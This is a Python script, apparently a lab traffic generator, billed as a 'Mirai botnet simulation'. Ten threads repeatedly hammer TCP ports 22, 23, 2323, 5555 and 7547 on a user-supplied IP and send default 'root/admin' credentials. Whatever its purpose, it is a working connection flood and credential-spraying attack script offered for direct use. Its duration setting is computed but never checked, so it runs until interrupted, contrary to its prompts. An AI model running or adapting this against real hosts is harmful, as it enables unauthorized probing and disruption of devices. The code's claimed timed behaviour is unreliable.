import socket
import time
import threading

def mirai_simulation(target_ip, duration=15):
    print(f"🦠 [Mirai Botnet] Simulating Mirai Telnet/SSH infection against {target_ip}")
    print("⚠️  Spamming rapid connection attempts to IoT management ports (23, 22, 5555)...")
    
    end_time = time.time() + duration
    ports = [22, 23, 2323, 5555, 7547] # Common Mirai target ports
    
    def bot_thread():
        while True:
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    s.connect((target_ip, port))
                    # Send typical Mirai default credential payloads
                    s.send(b"root\nadmin\n")
                    s.close()
                except:
                    pass
            time.sleep(0.01) # Extremely fast credential stuffing

    # Launch multiple bots
    for _ in range(10):
        t = threading.Thread(target=bot_thread)
        t.daemon = True
        t.start()
        
    try:
        while True:
            time.sleep(1)
            print("Infecting IoT devices...")
    except KeyboardInterrupt:
        pass
        
    print("✅ Mirai Simulation Complete.")

if __name__ == "__main__":
    ip = input("Enter Target IP (Default: 192.168.24.167): ")
    if not ip.strip(): ip = "192.168.24.167"
    dur = input("Enter Duration (Default: 15): ")
    dur = int(dur) if dur.strip().isdigit() else 15
    mirai_simulation(ip, dur)
